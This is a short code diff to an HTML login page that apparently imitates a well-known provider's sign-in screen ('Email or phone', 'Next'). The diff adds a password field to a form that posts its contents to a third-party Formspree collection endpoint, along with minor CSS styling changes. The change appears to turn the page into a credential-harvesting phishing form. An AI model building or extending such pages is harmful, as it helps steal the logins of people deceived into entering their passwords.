@@ -58,7 +58,8 @@
             line-height: 1.5;
         }
 
-        input[type="email"] {
+        input[type="email"],
+        input[type="password"] {
             appearance: none;
             width: 100%;
             box-sizing: border-box;
@@ -70,11 +71,13 @@
             height: 50px;
             outline: none;
             transition: border 0.2s;
+            margin-bottom: 10px; /* Spacing between fields */
         }
 
-        input[type="email"]:focus {
+        input[type="email"]:focus,
+        input[type="password"]:focus {
             border: 2px solid var(--primary-blue);
-            padding: 12px 14px;
+            padding: 12px 14px; /* Adjust padding to prevent layout shift when border width changes */
         }
 
         input::placeholder {
@@ -135,6 +138,7 @@
         <!-- FORMSPREE INTEGRATION -->
         <form action="https://formspree.io/f/mzeeaaep" method="POST">
             <input type="email" name="email" placeholder="Email or phone" required autocomplete="username">
+            <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
             
             <button type="submit" class="next-btn">Next</button>
             
